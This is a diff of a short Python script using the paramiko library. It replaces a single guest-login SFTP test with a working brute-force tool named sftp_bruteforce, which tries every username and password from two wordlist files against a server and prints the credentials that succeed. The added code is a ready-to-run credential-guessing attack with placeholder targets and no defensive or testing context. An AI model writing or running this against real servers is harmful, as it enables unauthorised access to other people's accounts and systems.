@@ -1,20 +1,30 @@
 import paramiko
 
-def test_guest_sftp(hostname, username, password):
-    try:
-        transport = paramiko.Transport((hostname, 22))
-        transport.connect(username=username, password=password)
-        sftp = paramiko.SFTPClient.from_transport(transport)
+def sftp_bruteforce(hostname, port, username_file, password_file):
+    with open(username_file, 'r') as uf, open(password_file, 'r') as pf:
+        usernames = uf.read().splitlines()
+        passwords = pf.read().splitlines()
 
-        print(f"Connected to {hostname} as {username}")
+        for username in usernames:
+            for password in passwords:
+                try:
+                    transport = paramiko.Transport((hostname, port))
+                    transport.connect(username=username, password=password)
+                    sftp = paramiko.SFTPClient.from_transport(transport)
+                    print(f"Success: {username}:{password}")
+                    sftp.close()
+                    transport.close()
+                    return
+                except paramiko.AuthenticationException:
+                    print(f"Failed: {username}:{password}")
+                except Exception as e:
+                    print(f"Error: {str(e)}")
+                    return
 
-        for item in sftp.listdir_attr('.'):
-            print(f"{item.filename} - {item.st_mode} - {item.st_size} bytes")
+# Customize these variables
+hostname = 'yourserver'
+port = 22
+username_file = 'usernames.txt'
+password_file = 'passwords.txt'
 
-        sftp.close()
-        transport.close()
-    except Exception as e:
-        print(f"Failed to connect: {str(e)}")
-
-# Test the guest login
-test_guest_sftp('yourserver', 'guestuser', 'guestpassword')
+sftp_bruteforce(hostname, port, username_file, password_file)
